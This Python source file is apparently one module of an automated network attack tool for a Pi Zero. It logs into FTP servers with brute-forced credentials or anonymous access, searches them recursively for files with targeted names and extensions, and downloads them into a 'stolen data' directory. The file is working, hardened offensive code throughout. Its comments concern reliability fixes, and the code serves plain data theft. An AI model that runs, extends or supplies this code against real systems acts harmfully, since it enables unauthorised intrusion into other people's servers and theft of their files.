"""
steal_files_ftp.py - This script connects to FTP servers using provided credentials or anonymous access, searches for specific files, and downloads them to a local directory.
"""

import os
import shutil
import logging
import time
from rich.console import Console
from threading import Timer
from ftplib import FTP
from shared import SharedData, settle_for_display
from logger import Logger

# Configure the logger
logger = Logger(name="steal_files_ftp.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesFTP"
b_module = "steal_files_ftp"
b_status = "steal_files_ftp"
b_parent = "FTPBruteforce"
b_port = 21

# Hard caps so a hostile/looped tree cannot hang or fill a 512 MB Pi Zero.
MAX_DEPTH = 6
MAX_FILES_PER_RUN = 100
MAX_FILE_BYTES = 50 * 1024 * 1024
MAX_RUN_BYTES = 200 * 1024 * 1024
MIN_FREE_BYTES = 100 * 1024 * 1024

class StealFilesFTP:
    """
    Class to handle the process of stealing files from FTP servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.ftp_connected = False
            self.stop_execution = False
            logger.info("StealFilesFTP initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_ftp(self, ip, username, password):
        """
        Establish an FTP connection.
        """
        try:
            ftp = FTP()
            ftp.connect(ip, 21, timeout=10)  # bounded: no timeout blocked the orchestrator on a filtered host
            ftp.login(user=username, passwd=password)
            self.ftp_connected = True
            logger.info(f"Connected to {ip} via FTP with username {username}")
            return ftp
        except Exception as e:
            logger.error(f"FTP connection error for {ip} with user '{username}' and password '{password}': {e}")
            return None

    def find_files(self, ftp, dir_path, depth=0, visited=None):
        """
        Find files in the FTP tree based on the configuration criteria.

        depth + visited guards stop cyclic directory structures from recursing
        forever and wedging the worker.
        """
        if visited is None:
            visited = set()
        files = []
        if depth > MAX_DEPTH:
            return files
        key = dir_path.rstrip('/') or '/'
        if key in visited:
            logger.warning(f"FTP cycle detected at {dir_path}; stopping recurse")
            return files
        visited.add(key)
        try:
            ftp.cwd(dir_path)
            items = ftp.nlst()
            for item in items:
                if self.shared_data.orchestrator_should_exit or getattr(self, 'stop_execution', False):
                    break
                if len(files) >= MAX_FILES_PER_RUN:
                    logger.warning(f"FTP file cap ({MAX_FILES_PER_RUN}) reached under {dir_path}")
                    break
                # Skip . and .. explicitly
                base = os.path.basename(item.rstrip('/'))
                if base in ('.', '..'):
                    continue
                try:
                    ftp.cwd(item)
                    ftp.cwd('..')  # it was a directory — recurse
                    files.extend(self.find_files(
                        ftp, os.path.join(dir_path, base),
                        depth=depth + 1, visited=visited,
                    ))
                    ftp.cwd(dir_path)  # restore after recurse
                except Exception:
                    if any(item.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                       any(file_name in item for file_name in self.shared_data.steal_file_names):
                        files.append(os.path.join(dir_path, item) if not item.startswith('/') else item)
            logger.info(f"Found {len(files)} matching files in {dir_path} on FTP")
        except Exception as e:
            logger.error(f"Error accessing path {dir_path} on FTP: {e}")
        return files

    def steal_file(self, ftp, remote_file, local_dir):
        """
        Download a file from the FTP server to the local directory.

        Enforces per-file / per-run byte budgets and a free-space precheck.
        """
        try:
            try:
                free = shutil.disk_usage(local_dir if os.path.isdir(local_dir) else os.path.dirname(local_dir) or '/').free
            except Exception:
                free = shutil.disk_usage('/').free
            if free < MIN_FREE_BYTES:
                logger.error(f"Refusing FTP steal: only {free} bytes free (need {MIN_FREE_BYTES})")
                self.stop_execution = True
                return
            if getattr(self, '_run_bytes', 0) >= MAX_RUN_BYTES:
                logger.warning(f"FTP per-run byte budget ({MAX_RUN_BYTES}) exhausted; stopping")
                self.stop_execution = True
                return

            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)

            written = [0]
            def _cb(chunk):
                written[0] += len(chunk)
                if written[0] > MAX_FILE_BYTES:
                    raise IOError(f"file exceeds MAX_FILE_BYTES ({MAX_FILE_BYTES})")
                if getattr(self, '_run_bytes', 0) + written[0] > MAX_RUN_BYTES:
                    raise IOError(f"run would exceed MAX_RUN_BYTES ({MAX_RUN_BYTES})")
                f.write(chunk)

            with open(local_file_path, 'wb') as f:
                ftp.retrbinary(f'RETR {remote_file}', _cb)
            self._run_bytes = getattr(self, '_run_bytes', 0) + written[0]
            logger.success(f"Downloaded file from {remote_file} to {local_file_path} ({written[0]} bytes)")
        except Exception as e:
            logger.error(f"Error downloading file {remote_file} from FTP: {e}")
            try:
                if 'local_file_path' in locals() and os.path.exists(local_file_path):
                    os.unlink(local_file_path)
            except OSError:
                pass

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the FTP server.
        """
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesFTP"
                # Per-run state, reset here rather than only in __init__. These objects are
                # long-lived singletons built once by orchestrator.load_action, so the flags
                # latched: once the 240s timer fired for ANY host, stop_execution stayed True
                # and every later steal on every host broke out immediately and returned
                # 'failed' — permanently, until the service restarted. Conversely a single
                # success left *_connected True and disarmed the timeout for good.
                self.stop_execution = False
                self.ftp_connected = False
                self._run_bytes = 0
                logger.info(f"Stealing files from {ip}:{port}...")
                settle_for_display(self.shared_data)  # let the panel show this action's name

                # Get FTP credentials from the cracked passwords file
                ftpfile = self.shared_data.ftpfile
                credentials = []
                if os.path.exists(ftpfile):
                    with open(ftpfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            parts = line.strip().split(',')
                            if parts[1] == ip:
                                credentials.append((parts[3], parts[4]))  # Username and password
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                def try_anonymous_access():
                    """
                    Try to access the FTP server without credentials.
                    """
                    try:
                        ftp = self.connect_ftp(ip, 'anonymous', '')
                        return ftp
                    except Exception as e:
                        logger.info(f"Anonymous access to {ip} failed: {e}")
                        return None

                if not credentials and not try_anonymous_access():
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    return 'failed'

                # Token this run. timer.cancel() is only reached on the success path, so a failed
                # steal leaves a live 240s timer behind; without this it would fire midway
                # through a LATER host's steal and abort it by setting stop_execution.
                run_token = object()
                self._run_token = run_token

                def timeout():
                    """
                    Timeout function to stop the execution if no FTP connection is established.
                    """
                    if getattr(self, '_run_token', None) is not run_token:
                        return  # a later execute() owns the flags now
                    if not self.ftp_connected:
                        logger.error(f"No FTP connection established within 4 minutes for {ip}. Marking as failed.")
                        self.stop_execution = True

                timer = Timer(240, timeout)  # 4 minutes timeout
                timer.daemon = True  # never hold up shutdown waiting for a 4-minute timer
                timer.start()

                # Attempt anonymous access first
                success = False
                ftp = try_anonymous_access()
                if ftp:
                    remote_files = self.find_files(ftp, '/')
                    mac = row['MAC Address']
                    local_dir = os.path.join(self.shared_data.datastolendir, f"ftp/{mac}_{ip}/anonymous")
                    if remote_files:
                        for remote_file in remote_files:
                            if self.stop_execution:
                                break
                            self.steal_file(ftp, remote_file, local_dir)
                        success = True
                        countfiles = len(remote_files)
                        logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} via anonymous access")
                    ftp.quit()
                    if success:
                        timer.cancel()  # Cancel the timer if the operation is successful

                # Attempt to steal files using each credential if anonymous access fails
                for username, password in credentials:
                    if self.stop_execution:
                        break
                    try:
                        logger.info(f"Trying credential {username}:{password} for {ip}")
                        ftp = self.connect_ftp(ip, username, password)
                        if ftp:
                            remote_files = self.find_files(ftp, '/')
                            mac = row['MAC Address']
                            local_dir = os.path.join(self.shared_data.datastolendir, f"ftp/{mac}_{ip}/{username}")
                            if remote_files:
                                for remote_file in remote_files:
                                    if self.stop_execution:
                                        break
                                    self.steal_file(ftp, remote_file, local_dir)
                                success = True
                                countfiles = len(remote_files)
                                logger.info(f"Successfully stolen {countfiles} files from {ip}:{port} with user '{username}'")
                            ftp.quit()
                            if success:
                                timer.cancel()  # Cancel the timer if the operation is successful
                                break  # Exit the loop as we have found valid credentials
                    except Exception as e:
                        logger.error(f"Error stealing files from {ip} with user '{username}': {e}")

                # Ensure the action is marked as failed if no files were found
                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    return 'failed'
                else:
                    return 'success'
            else:
                # The four sibling steal modules all return here; this one had no `else` and fell
                # off the end returning None, which the orchestrator then wrote as failed_<ts>
                # anyway — the right outcome by accident, via an implicit return.
                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_ftp = StealFilesFTP(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
